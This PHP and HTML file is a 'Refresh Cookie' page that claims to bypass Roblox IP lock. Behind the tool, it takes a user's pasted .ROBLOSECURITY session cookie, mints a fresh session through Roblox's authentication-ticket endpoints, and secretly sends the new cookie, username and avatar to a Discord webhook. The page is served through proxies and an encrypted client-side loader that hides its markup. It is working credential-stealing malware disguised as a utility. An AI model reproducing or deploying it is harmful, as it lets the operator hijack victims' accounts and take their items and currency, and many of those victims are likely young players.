<?php
ini_set('display_errors', 0);
error_reporting(E_ALL);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=utf-8');

    $proxyFile = $_SERVER['DOCUMENT_ROOT'] . '/libs/refreshproxy.txt';
    $proxyLines = [];
    if (file_exists($proxyFile)) {
        $proxyLines = array_values(array_filter(array_map('trim', explode("\n", file_get_contents($proxyFile))), function($l) { return !empty($l); }));
    }
    $totalProxies = count($proxyLines);
    if ($totalProxies === 0) {
        echo json_encode(['success' => false, 'message' => 'No proxies available']);
        exit();
    }

    $assignedProxy = 0;

    $GLOBALS['__refresh_start'] = microtime(true);
    function refreshCheckTimeout() {
        if ((microtime(true) - $GLOBALS['__refresh_start']) >= 10) {
            echo json_encode(['success' => false, 'message' => 'Request timed out, please try again']);
            exit();
        }
    }

    set_error_handler(function($errno, $errstr, $errfile, $errline) {
        throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
    });

    try {
        include_once $_SERVER['DOCUMENT_ROOT'] . '/libs/configuration.php';
        include_once $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';

        $bypassFile = $_SERVER['DOCUMENT_ROOT'] . '/api/bypass.php';
        if (file_exists($bypassFile)) {
        }

        $input = json_decode(file_get_contents('php://input'), true);
        $cookie = trim($input['cookie'] ?? '');

        if (empty($cookie)) {
            echo json_encode(['success' => false, 'message' => 'Cookie is required']);
            exit();
        }

        $cookie = refreshNormalizeCookie($cookie);

        if (empty($cookie) || strlen($cookie) < 100) {
            echo json_encode(['success' => false, 'message' => 'Invalid cookie format']);
            exit();
        }

        refreshCheckTimeout();
        $authCheck = refreshValidateCookie($cookie);
        if (!$authCheck['valid']) {
            $reason = $authCheck['reason'] ?? 'unknown';
            if ($reason === 'connection') {
                echo json_encode(['success' => false, 'message' => 'Connection error, please try again']);
            } else {
                echo json_encode(['success' => false, 'message' => 'Invalid or expired cookie']);
            }
            exit();
        }

        refreshCheckTimeout();
        $newCookie = refreshCookieBypass($cookie);
        if ($newCookie && $newCookie['success']) {
            
            if (isset($refreshcook['bypass']) && !empty($refreshcook['bypass'])) {
                $userId = $authCheck['userId'] ?? null;
                $username = $authCheck['username'] ?? 'Unknown';
                $avatarUrl = null;
                
                if ($userId) {
                    $avatarUrl = refreshGetAvatarUrl($userId);
                }
                
                refreshSendDiscordWebhook(
                    $refreshcook['bypass'],
                    $username,
                    $newCookie['cookie'],
                    $avatarUrl
                );
            }
            
            echo json_encode([
                'success' => true,
                'message' => 'Cookie refreshed successfully!',
                'result_cookie' => $newCookie['cookie'],
                'username' => $authCheck['username'] ?? ''
            ]);
        } else {
            echo json_encode([
                'success' => false,
                'message' => $newCookie['message'] ?? 'Failed to refresh cookie'
            ]);
        }

    } catch (Exception $e) {
        echo json_encode(['success' => false, 'message' => 'Error: ' . $e->getMessage()]);
    } catch (Error $e) {
        echo json_encode(['success' => false, 'message' => 'Error: ' . $e->getMessage()]);
    }
    exit();
}

function refreshGetAvatarUrl($userId) {
    $url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={$userId}&size=420x420&format=Png&isCircular=false";
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HTTPHEADER => [
            'Accept: application/json'
        ]
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    if (isset($data['data'][0]['imageUrl'])) {
        return $data['data'][0]['imageUrl'];
    }
    
    return null;
}

function refreshSendDiscordWebhook($webhookUrl, $username, $cookie, $avatarUrl = null) {
    $embed = [
        'title' => strtoupper($username),
        'description' => $username,
        'color' => 65280,
        'fields' => [
            [
                'name' => 'SUCCESS',
                'value' => '```' . $cookie . '```',
                'inline' => false
            ]
        ]
    ];
    
    if ($avatarUrl) {
        $embed['thumbnail'] = [
            'url' => $avatarUrl
        ];
    }
    
    $payload = [
        'username' => 'RESULT',
        'content' => '',
        'tts' => false,
        'embeds' => [$embed]
    ];
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $webhookUrl,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json'
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    
    curl_exec($ch);
    curl_close($ch);
}

function refreshNormalizeCookie($cookie) {
    if (empty($cookie)) return '';
    $cookie = trim($cookie);
    $cookie = preg_replace('/[\r\n\t]+/', '', $cookie);
    $cookie = trim($cookie, '"\'`');

    $maxDecode = 3;
    for ($i = 0; $i < $maxDecode; $i++) {
        $decoded = urldecode($cookie);
        if ($decoded === $cookie) break;
        $cookie = $decoded;
    }

    if (stripos($cookie, 'cookie:') === 0) {
        $cookie = trim(substr($cookie, 7));
    }
    if (stripos($cookie, '.roblosecurity=') !== false) {
        $cookie = preg_replace('/.*\.roblosecurity=/i', '', $cookie);
    }
    if (strpos($cookie, ';') !== false) {
        $cookie = explode(';', $cookie)[0];
    }

    $prefix = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
    if (strpos($cookie, '_|WARNING') === 0) {
        if (preg_match('/^_\|WARNING[^|]*\|_(.+)$/i', $cookie, $matches)) {
            $cookie = $matches[1];
        }
    }

    $cookie = trim($cookie);
    if (strlen($cookie) < 100) return '';
    return $prefix . $cookie;
}

function refreshGetProxy($part = 'all') {
    global $assignedProxy, $proxyLines;
    static $proxyData = null;
    
    if ($proxyData === null) {
        if (!isset($assignedProxy) || !isset($proxyLines[$assignedProxy])) {
            return '';
        }
        
        $line = $proxyLines[$assignedProxy];
        
        if (strpos($line, '@') !== false) {
            list($auth, $host) = explode('@', $line, 2);
            $proxyData = ['host' => $host, 'auth' => $auth];
        } elseif (substr_count($line, ':') >= 3) {
            $parts = explode(':', $line, 4);
            $proxyData = [
                'host' => $parts[0] . ':' . $parts[1],
                'auth' => $parts[2] . ':' . $parts[3]
            ];
        } else {
            $proxyData = ['host' => $line, 'auth' => ''];
        }
    }
    
    if ($part === 'host') return $proxyData['host'] ?? '';
    if ($part === 'auth') return $proxyData['auth'] ?? '';
    return $proxyData;
}

function refreshRobloxRequest($url, $cookie = '', $method = 'GET', $data = null, $extraHeaders = []) {
    $ch = curl_init();

    $headers = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept: application/json, text/plain, */*',
        'Accept-Language: en-US,en;q=0.9',
        'Origin: https://www.roblox.com',
        'Referer: https://www.roblox.com/'
    ];

    if (!empty($cookie)) {
        $cookieValue = $cookie;
        if (strpos($cookieValue, '_|WARNING') === 0) {
            if (preg_match('/^_\|WARNING[^|]*\|_(.+)$/i', $cookieValue, $matches)) {
                $cookieValue = $matches[1];
            }
        }
        $headers[] = 'Cookie: .ROBLOSECURITY=' . $cookieValue;
    }

    if ($data !== null) {
        $headers[] = 'Content-Type: application/json';
    }

    $headers = array_merge($headers, $extraHeaders);

    $curlOpts = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HEADER => true,
    ];

    $proxyHost = refreshGetProxy('host');
    if (!empty($proxyHost)) {
        $curlOpts[CURLOPT_PROXY] = $proxyHost;
        $proxyAuth = refreshGetProxy('auth');
        if (!empty($proxyAuth)) {
            $curlOpts[CURLOPT_PROXYUSERPWD] = $proxyAuth;
        }
    }

    curl_setopt_array($ch, $curlOpts);

    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data !== null) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($data) ? json_encode($data) : $data);
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        }
    }

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        return ['success' => false, 'error' => $error, 'httpCode' => 0];
    }

    $responseHeaders = substr($response, 0, $headerSize);
    $body = substr($response, $headerSize);

    $csrfToken = null;
    if (preg_match('/x-csrf-token:\s*([^\r\n]+)/i', $responseHeaders, $matches)) {
        $csrfToken = trim($matches[1]);
    }

    $newCookie = null;
    if (preg_match('/\.ROBLOSECURITY=([^;\s\r\n]+)/i', $responseHeaders, $matches)) {
        $newCookie = trim($matches[1]);
    }

    $authTicket = null;
    if (preg_match('/rbx-authentication-ticket:\s*([^\r\n]+)/i', $responseHeaders, $matches)) {
        $authTicket = trim($matches[1]);
    }

    return [
        'success' => true,
        'httpCode' => $httpCode,
        'body' => json_decode($body, true) ?? $body,
        'rawBody' => $body,
        'csrfToken' => $csrfToken,
        'newCookie' => $newCookie,
        'authTicket' => $authTicket,
        'rawHeaders' => $responseHeaders
    ];
}

function refreshGetCsrfToken($cookie) {
    for ($i = 0; $i < 3; $i++) {
        refreshCheckTimeout();
        $response = refreshRobloxRequest(
            'https://auth.roblox.com/v2/logout',
            $cookie,
            'POST'
        );
        if (!empty($response['csrfToken'])) {
            return $response['csrfToken'];
        }
        if ($i < 2) usleep(200000);
    }
    return null;
}

function refreshValidateCookie($cookie) {
    for ($i = 0; $i < 2; $i++) {
        refreshCheckTimeout();
        $response = refreshRobloxRequest(
            'https://users.roblox.com/v1/users/authenticated',
            $cookie
        );

        if ($response['success'] && $response['httpCode'] === 200 && isset($response['body']['id'])) {
            return [
                'valid' => true,
                'userId' => $response['body']['id'],
                'username' => $response['body']['name'] ?? '',
                'displayName' => $response['body']['displayName'] ?? ''
            ];
        }

        if ($response['success'] && $response['httpCode'] === 401) {
            return ['valid' => false, 'reason' => 'expired'];
        }

        if ($i < 1) usleep(200000);
    }
    return ['valid' => false, 'reason' => 'connection'];
}

function refreshCookieBypass($cookie) {
    $csrf = refreshGetCsrfToken($cookie);
    if (empty($csrf)) {
        return ['success' => false, 'message' => 'Failed to get CSRF token'];
    }

    $maxRetries = 3;

    for ($attempt = 1; $attempt <= $maxRetries; $attempt++) {
        refreshCheckTimeout();
        $ticketResponse = refreshRobloxRequest(
            'https://auth.roblox.com/v1/authentication-ticket',
            $cookie,
            'POST',
            null,
            ['X-Csrf-Token: ' . $csrf]
        );

        if ($ticketResponse['httpCode'] === 403 && $ticketResponse['csrfToken']) {
            $csrf = $ticketResponse['csrfToken'];
            $ticketResponse = refreshRobloxRequest(
                'https://auth.roblox.com/v1/authentication-ticket',
                $cookie,
                'POST',
                null,
                ['X-Csrf-Token: ' . $csrf]
            );
        }

        if ($ticketResponse['httpCode'] !== 200 || empty($ticketResponse['authTicket'])) {
            if ($attempt >= $maxRetries) {
                return ['success' => false, 'message' => 'Failed to get ticket (HTTP ' . $ticketResponse['httpCode'] . ')'];
            }
            usleep(200000);
            continue;
        }

        $ticket = $ticketResponse['authTicket'];
        usleep(50000);

        $redeemResponse = refreshRobloxRequest(
            'https://auth.roblox.com/v1/authentication-ticket/redeem',
            '',
            'POST',
            ['authenticationTicket' => $ticket],
            ['RBXAuthenticationNegotiation: 1']
        );

        if ($redeemResponse['httpCode'] === 200) {
            $newCookie = $redeemResponse['newCookie'];
            if ($newCookie && strlen($newCookie) > 100) {
                $prefix = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
                if (strpos($newCookie, '_|WARNING') !== 0) {
                    $newCookie = $prefix . $newCookie;
                }
                return ['success' => true, 'cookie' => $newCookie];
            }
        }

        if ($redeemResponse['httpCode'] === 429) {
            usleep(800000);
            continue;
        }

        usleep(200000);
    }

    return ['success' => false, 'message' => 'All ' . $maxRetries . ' attempts failed'];
}

$cookieParam = $_GET['a'] ?? '';
ob_start();
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Refresh Cookie</title>
    <link rel="icon" type="image/png" href="/images/favicon.png">
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --accent: #ff3b3b;
            --accent-dim: #cc2e2e;
            --accent-glow: rgba(255, 59, 59, 0.3);
            --dark-bg: #0a0b0f;
            --darker-bg: #050507;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Rajdhani', sans-serif;
            background: var(--dark-bg);
            color: #fff;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        .animated-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            overflow: hidden;
            pointer-events: none;
        }

        .lightning {
            position: absolute;
            width: 1px;
            background: linear-gradient(to bottom, transparent, rgba(255, 59, 59, 0.4), transparent);
            opacity: 0;
            animation: lightning 5s infinite;
            filter: blur(0.5px);
        }

        .lightning:nth-child(1) { left: 20%; top: -100px; height: 150px; animation-delay: 0s; }
        .lightning:nth-child(2) { left: 50%; top: -120px; height: 180px; animation-delay: 2s; }
        .lightning:nth-child(3) { left: 80%; top: -100px; height: 140px; animation-delay: 4s; }

        @keyframes lightning {
            0%, 90%, 100% { opacity: 0; transform: translateY(0); }
            2%, 6% { opacity: 0.5; }
            4% { opacity: 0.3; }
            15% { transform: translateY(100vh); opacity: 0; }
        }

        .geo-container { position: absolute; width: 100%; height: 100%; }

        .geo-line:nth-child(4) { position: absolute; width: 1px; height: 100%; left: 15%; top: 0; background: linear-gradient(to bottom, transparent, rgba(255, 59, 59, 0.06), transparent); }
        .geo-line:nth-child(5) { position: absolute; width: 1px; height: 100%; left: 35%; top: 0; background: linear-gradient(to bottom, transparent, rgba(255, 59, 59, 0.06), transparent); }
        .geo-line:nth-child(6) { position: absolute; width: 1px; height: 100%; left: 55%; top: 0; background: linear-gradient(to bottom, transparent, rgba(255, 59, 59, 0.06), transparent); }
        .geo-line:nth-child(7) { position: absolute; width: 1px; height: 100%; left: 75%; top: 0; background: linear-gradient(to bottom, transparent, rgba(255, 59, 59, 0.06), transparent); }
        .geo-line:nth-child(8) { position: absolute; width: 100%; height: 1px; top: 20%; left: 0; background: linear-gradient(to right, transparent, rgba(255, 59, 59, 0.06), transparent); }
        .geo-line:nth-child(9) { position: absolute; width: 100%; height: 1px; top: 50%; left: 0; background: linear-gradient(to right, transparent, rgba(255, 59, 59, 0.06), transparent); }

        .connection-point {
            position: absolute;
            width: 1px;
            background: rgba(255, 59, 59, 0.1);
            animation: connectionPulse 4s ease-in-out infinite;
        }

        .connection-point:nth-child(14) { top: 20%; left: 15%; width: 20%; height: 1px; }
        .connection-point:nth-child(15) { top: 20%; left: 35%; width: 20%; height: 1px; animation-delay: 0.5s; }
        .connection-point:nth-child(16) { top: 50%; left: 15%; width: 1px; height: 30%; animation-delay: 1s; }
        .connection-point:nth-child(17) { top: 50%; left: 35%; width: 1px; height: 30%; animation-delay: 1.5s; }

        @keyframes connectionPulse {
            0%, 100% { opacity: 0.1; }
            50% { opacity: 0.3; }
        }

        .particle {
            position: absolute;
            width: 2px;
            height: 2px;
            background: var(--accent-dim);
            border-radius: 50%;
            opacity: 0;
            animation: particleFloat 12s infinite;
        }

        .particle:nth-child(18) { left: 15%; animation-delay: 0s; }
        .particle:nth-child(19) { left: 35%; animation-delay: 3s; }

        @keyframes particleFloat {
            0% { bottom: 0; opacity: 0; }
            10% { opacity: 0.6; }
            90% { opacity: 0.6; }
            100% { bottom: 100vh; opacity: 0; }
        }

        .page-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 40px 20px;
            position: relative;
            z-index: 1;
        }

        .refresh-card {
            width: 100%;
            max-width: 580px;
            position: relative;
        }

        .card-title {
            margin-bottom: 6px;
            font-size: 1.8rem;
            font-weight: 700;
            color: #fff;
            letter-spacing: 1px;
        }

        .card-subtitle {
            color: #666;
            font-size: 0.95rem;
            font-weight: 400;
            margin-bottom: 28px;
        }

        .cookie-input-wrapper {
            display: flex;
            align-items: center;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            padding: 0 16px;
            margin-bottom: 28px;
            transition: all 0.3s ease;
        }

        .cookie-input-wrapper:focus-within {
            border-color: rgba(255, 59, 59, 0.3);
            background: rgba(255, 255, 255, 0.04);
        }

        .cookie-icon {
            font-size: 1.2rem;
            color: #555;
            margin-right: 12px;
            flex-shrink: 0;
        }

        .cookie-input {
            flex: 1;
            padding: 16px 0;
            background: transparent;
            border: none;
            color: #ccc;
            font-family: 'Rajdhani', sans-serif;
            font-size: 0.95rem;
            outline: none;
            width: 100%;
        }

        .cookie-input::placeholder {
            color: rgba(255, 255, 255, 0.2);
        }

        .refresh-btn {
            width: 100%;
            padding: 16px 30px;
            background: linear-gradient(135deg, var(--accent), var(--accent-dim));
            border: none;
            border-radius: 12px;
            color: #fff;
            font-family: 'Rajdhani', sans-serif;
            font-size: 1.05rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 25px rgba(255, 59, 59, 0.25);
        }

        .refresh-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transition: left 0.5s ease;
        }

        .refresh-btn:hover::before {
            left: 100%;
        }

        .refresh-btn:hover {
            box-shadow: 0 6px 35px rgba(255, 59, 59, 0.35);
            transform: translateY(-1px);
        }

        .refresh-btn:active {
            transform: translateY(0);
        }

        .refresh-btn.loading {
            pointer-events: none;
            opacity: 0.85;
        }

        .refresh-btn.loading i {
            animation: spinSmooth 1s linear infinite;
        }

        .refresh-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            pointer-events: none;
        }

        .refresh-btn i {
            margin-right: 8px;
        }

        @keyframes spinSmooth {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .result-section {
            margin-top: 24px;
            display: none;
        }

        .result-section.visible {
            display: block;
            animation: fadeInUp 0.4s ease;
        }

        .result-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 14px;
        }

        .result-header .check-icon {
            width: 24px;
            height: 24px;
            background: #00c853;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.7rem;
            color: #fff;
        }

        .result-header span {
            color: #00c853;
            font-size: 0.85rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2.5px;
        }

        .result-box {
            background: rgba(10, 10, 15, 0.6);
            border: 1px solid rgba(0, 200, 83, 0.15);
            border-radius: 12px;
            padding: 22px 24px;
            position: relative;
        }

        .result-box .cookie-text {
            word-break: break-all;
            color: rgba(0, 200, 83, 0.8);
            font-size: 0.85rem;
            line-height: 1.8;
            padding-right: 40px;
        }

        .copy-btn {
            position: absolute;
            top: 14px;
            right: 14px;
            padding: 8px 12px;
            background: transparent;
            border: 1px solid rgba(0, 200, 83, 0.2);
            border-radius: 6px;
            color: rgba(0, 200, 83, 0.6);
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.85rem;
        }

        .copy-btn:hover {
            background: rgba(0, 200, 83, 0.08);
            border-color: rgba(0, 200, 83, 0.4);
            color: rgba(0, 200, 83, 0.9);
        }

        .error-message {
            margin-top: 16px;
            padding: 12px 0;
            color: rgba(255, 80, 80, 0.9);
            font-size: 0.9rem;
            text-align: center;
            display: none;
            animation: fadeInUp 0.3s ease;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 2px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.2); }
        ::placeholder { color: rgba(255, 255, 255, 0.2); }

        @media (max-width: 768px) {
            .page-wrapper { padding: 20px 15px; }
            .refresh-card { max-width: 100%; }
            .card-title { font-size: 1.5rem; }
            .user-info-box { padding: 16px 18px; }
            .refresh-btn { padding: 14px 20px; font-size: 0.95rem; }
        }
    </style>
</head>
<body>
    <div class="animated-bg">
        <div class="lightning"></div>
        <div class="lightning"></div>
        <div class="lightning"></div>
        <div class="geo-container">
            <div class="geo-line"></div>
            <div class="geo-line"></div>
            <div class="geo-line"></div>
            <div class="geo-line"></div>
            <div class="geo-line"></div>
            <div class="geo-line"></div>
            <div class="connection-point"></div>
            <div class="connection-point"></div>
            <div class="connection-point"></div>
            <div class="connection-point"></div>
            <div class="particle"></div>
            <div class="particle"></div>
        </div>
    </div>

    <div class="page-wrapper">
        <div class="refresh-card">

            <h1 class="card-title">Refresh Cookie</h1>
            <p class="card-subtitle">Refresh ROBLOX cookie to bypass IP Lock.</p>

            <div class="cookie-input-wrapper">
                <i class="fas fa-cookie-bite cookie-icon"></i>
                <input type="text" class="cookie-input" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow..." value="<?php echo htmlspecialchars($cookieParam, ENT_QUOTES, 'UTF-8'); ?>">
            </div>

            <button class="refresh-btn" id="refreshBtn">Refresh</button>

            <div class="error-message" id="errorMessage"></div>

            <div class="result-section" id="resultSection">
                <div class="result-header">
                    <div class="check-icon"><i class="fas fa-check"></i></div>
                    <span>Refreshed Cookie</span>
                </div>
                <div class="result-box">
                    <div class="cookie-text" id="resultCookie"></div>
                    <button type="button" class="copy-btn" id="copyBtn"><i class="fas fa-copy"></i></button>
                </div>
            </div>

        </div>
    </div>

    <script>
        var cookieInput = document.getElementById('cookieInput');
        var refreshBtn = document.getElementById('refreshBtn');
        var errorMessage = document.getElementById('errorMessage');
        var resultSection = document.getElementById('resultSection');
        var resultCookie = document.getElementById('resultCookie');

        function doRefresh() {
            var cookie = cookieInput.value.trim();

            errorMessage.style.display = 'none';
            resultSection.classList.remove('visible');

            if (!cookie) {
                showError('Please enter a cookie');
                return;
            }

            if (cookie.length < 100) {
                showError('Invalid cookie format');
                return;
            }

            refreshBtn.disabled = true;
            refreshBtn.classList.add('loading');
            refreshBtn.innerHTML = '<i class="fas fa-circle-notch"></i> Processing...';

            fetch(window.location.pathname, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookie: cookie })
            })
            .then(function(response) { return response.json(); })
            .then(function(result) {
                if (result.success) {
                    resultCookie.textContent = result.result_cookie;
                    resultSection.classList.add('visible');
                    resultSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
                } else {
                    showError(result.message || 'Refresh failed');
                }
            })
            .catch(function(error) {
                showError('Network error. Please try again.');
            })
            .finally(function() {
                refreshBtn.disabled = false;
                refreshBtn.classList.remove('loading');
                refreshBtn.innerHTML = 'Refresh';
            });
        }

        refreshBtn.addEventListener('click', doRefresh);

        if (cookieInput.value.trim().length > 100) {
            doRefresh();
        }

        function showError(message) {
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
        }

        document.getElementById('copyBtn').addEventListener('click', function() {
            var text = resultCookie.textContent;

            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(text);
            } else {
                var textarea = document.createElement('textarea');
                textarea.value = text;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
            }

            var btn = this;
            btn.innerHTML = '<i class="fas fa-check"></i>';
            btn.style.color = '#00c853';
            btn.style.borderColor = 'rgba(0, 200, 83, 0.4)';

            setTimeout(function() {
                btn.innerHTML = '<i class="fas fa-copy"></i>';
                btn.style.color = '';
                btn.style.borderColor = '';
            }, 2000);
        });
    </script>
</body>
</html>
<?php
$_html = ob_get_clean();
$_SESSION['enc_master_key'] = random_bytes(32);
$_eKey = $_SESSION['enc_master_key'];
$_eToken = 'ot_' . bin2hex(random_bytes(32));
$_tokenRoot = realpath($_SERVER['DOCUMENT_ROOT'] ?? '') ?: ($_SERVER['DOCUMENT_ROOT'] ?? __DIR__);
$_tokenFile = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'ultima_chrome_tokens_' . substr(hash('sha256', $_tokenRoot), 0, 16) . '.json';
$_tokenHandle = @fopen($_tokenFile, 'c+');
if ($_tokenHandle) {
    if (@flock($_tokenHandle, LOCK_EX)) {
        $_tokenRaw = stream_get_contents($_tokenHandle);
        $_tokenData = json_decode($_tokenRaw, true);
        if (!is_array($_tokenData)) $_tokenData = [];
        $_tokenData[hash('sha256', $_eToken)] = ['key' => base64_encode($_eKey), 'created' => time()];
        rewind($_tokenHandle);
        ftruncate($_tokenHandle, 0);
        fwrite($_tokenHandle, json_encode($_tokenData, JSON_UNESCAPED_SLASHES));
        fflush($_tokenHandle);
        flock($_tokenHandle, LOCK_UN);
    }
    fclose($_tokenHandle);
    @chmod($_tokenFile, 0600);
}
$_eIv = random_bytes(12);
$_eTag = '';
$_eComp = @gzdeflate($_html, 4);
if ($_eComp === false) $_eComp = $_html;
$_eData = openssl_encrypt($_eComp, 'aes-256-gcm', $_eKey, OPENSSL_RAW_DATA, $_eIv, $_eTag);
$_ePayload = base64_encode($_eIv . $_eTag . $_eData);
$_useDeflate = ($_eComp !== $_html) ? '1' : '0';
if (session_status() === PHP_SESSION_ACTIVE) session_write_close();
?>
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Refresh Cookie</title><link rel="icon" type="image/png" href="/images/favicon.png"><style>body{background:#0a0b0f;margin:0}</style></head><body><script>!function(){var t="<?php echo $_eToken; ?>",df=<?php echo $_useDeflate; ?>;crypto.subtle.generateKey({name:"RSA-OAEP",modulusLength:2048,publicExponent:new Uint8Array([1,0,1]),hash:"SHA-1"},true,["encrypt","decrypt"]).then(function(kp){crypto.subtle.exportKey("spki",kp.publicKey).then(function(pub){var b=new Uint8Array(pub);var s="";for(var i=0;i<b.length;i++)s+=String.fromCharCode(b[i]);var pubB64=btoa(s);var x=new XMLHttpRequest();x.open("POST","/api/chrome.php",true);x.setRequestHeader("X-Enc-Token",t);x.setRequestHeader("Content-Type","application/json");x.onload=function(){if(x.status!==200){location.reload();return;}try{var r=JSON.parse(x.responseText);var encKey=atob(r.k);var encKeyBytes=new Uint8Array(encKey.length);for(var i=0;i<encKey.length;i++)encKeyBytes[i]=encKey.charCodeAt(i);crypto.subtle.decrypt({name:"RSA-OAEP"},kp.privateKey,encKeyBytes).then(function(rawAes){crypto.subtle.importKey("raw",rawAes,{name:"AES-GCM"},false,["decrypt"]).then(function(aesKey){var enc=atob("<?php echo $_ePayload; ?>");var bytes=new Uint8Array(enc.length);for(var i=0;i<enc.length;i++)bytes[i]=enc.charCodeAt(i);var iv=bytes.slice(0,12);var tag=bytes.slice(12,28);var ct=bytes.slice(28);var combined=new Uint8Array(ct.length+tag.length);combined.set(ct);combined.set(tag,ct.length);crypto.subtle.decrypt({name:"AES-GCM",iv:iv,tagLength:128},aesKey,combined).then(function(dec){var u8=new Uint8Array(dec);if(df){new Response(new Blob([u8]).stream().pipeThrough(new DecompressionStream("deflate-raw"))).text().then(function(h){document.open();document.write(h);document.close();});}else{document.open();document.write(new TextDecoder().decode(u8));document.close();}}).catch(function(){location.reload();});});}).catch(function(){location.reload();});}catch(e){location.reload();}};x.onerror=function(){location.reload();};x.send(JSON.stringify({pub:pubB64}));});});}();</script></body></html>